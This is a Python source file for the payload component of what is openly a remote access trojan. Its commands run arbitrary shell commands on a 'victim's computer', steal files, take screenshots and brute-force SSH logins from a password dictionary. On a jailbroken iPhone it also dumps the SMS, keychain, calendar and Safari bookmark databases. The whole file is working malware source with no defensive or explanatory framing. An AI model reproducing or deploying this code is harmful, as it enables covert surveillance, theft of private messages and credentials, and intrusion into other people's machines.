import subprocess
import binascii
import time
iphone = False
try:
    import pyscreenshot as ImageGrab
except:
    print "[-] pyscreenshot not present"

try:
    import paramiko
except:
    print "[-] paramiko not present"
# from PIL import ImageGrab
import sqlite3

#determine os and machine
import platform
if platform.machine() == 'iPhone4,1':
    iphone = True


class Payload:
    def __init__(self):
        if iphone:
            self.commands = {
                '!shell': self._shell,
                '!grab': self._grab,
                '!sql': self._sql,
                '!help': self._help
            }

        else:
            self.commands = {
                '!shell': self._shell,
                '!grab': self._grab,
                '!screen': self._screen,
                '!sshcrack': self._ssh_brute_force,
                '!help': self._help
            }

    def _shell(self, cmd):
        p = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
        out, err = p.communicate()
        return "stdout: %s\nstderr: %s" % (out, err), 0

    def _screen(self):
        try:
            im = ImageGrab.grab()
            im.save('/tmp/grab.png')
            return open('/tmp/grab.png', 'rb').read(), 1
        except:
            try:
                im = ImageGrab.grab()
                im.save('C:\Users\Public\grab.png')
                return open('C:\Users\Public\grab.png', 'rb').read(), 1
            except:
                return "[-] Error executing command", 0

    def _grab(self, filename):
        try:
            return open(filename, 'rb').read(), 1
        except:
            return "[-] Error executing command", 0

    def _ssh_brute_force(self, ip_addr):
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

            for line in open('dictionary.txt'):
                username, password = line.strip().split(':')

                try:
                    print "[+] Trying username <%s> and password <%s> for host %s" % (username, password, ip_addr)
                    ssh.connect(ip_addr, username=username, password=password)

                except paramiko.AuthenticationException:
                    print "[-] Failure"

                else:
                    return "[+] Success!\nUsername: %s\nPassword: %s" % (username, password), 0

        except:
            return "[-] Error executing command", 0

    def _sql(self, db):
        database_dict = {
            'calendar': ['/var/mobile/Library/Calendar/Calendar.sqlitedb', 'select summary, description, start_date, end_date from CalendarItem'],
            'keychain': ['/var/Keychains/keychain-2.db', 'select agrp, sha1 from keys'],
            'bookmarks': ['/var/mobile/Library/Safari/Bookmarks.db', 'select title, url from bookmarks'],
            'sms': ['/var/mobile/Library/SMS/sms.db', 'select m.text, c.guid from message as m, chat as c where m.ROWID=c.ROWID']
        }

        if db in database_dict:
            database_name = database_dict[db][0]
        else:
            return "[-] Error executing command", 0

        con = sqlite3.connect(database_name)
        cur = con.cursor()
        cur.execute(database_dict[db][1])
        data = cur.fetchall()

        # convert unix timestamps to time
        # timeconv = lambda t: [t[0], t[1], time.ctime(t[2]), time.ctime(t[3])]

        if db == 'calendar':
            data = map(lambda t: [t[0], t[1], time.ctime(t[2]), time.ctime(t[3])], data)

        elif db == 'keychain':
            data = map(lambda t: [t[0], binascii.hexlify(str(t[1]))], data)

        con.close()
        # print data
        return str(data), 2

    def _help(self):
        if iphone:
            h = """Help:
            !shell <command>: run a command on victim's computer
            !grab <filepath>: download a file from the victim's computer
            !sql calendar/keychain/bookmarks/sms: dump the calendar/keychain/bookmarks/sms database
            !upload <filepath>: upload a file to victim's computer's as /tmp/file
            !help: display this
            !kill: close connection
            """

        else:
            h = """Help:
            !shell <command>: run a command provided in bash and returns the output
            !grab <filepath>: download a file from the victim's computer
            !screen: takes a screenshot of the victim's desktop and saves the image on Desktop/c2
            !sshcrack <ip>: run a dictionary attack on computer running an ssh server
            !upload <filepath>: upload a file to victim's computer's as /tmp/file
            !help: display this
            !kill: close connection
            """
        return h, 0

    def execute_command(self, command, args=None):
        if command in self.commands:
            func = self.commands[command]
            if args:
                try:
                    return func(args)
                except:
                    return "[-] Error executing command", 0
            else:
                try:
                    return func()
                except:
                    return "[-] Error executing command", 0
        else:
            return "[-] Command not supported", 0
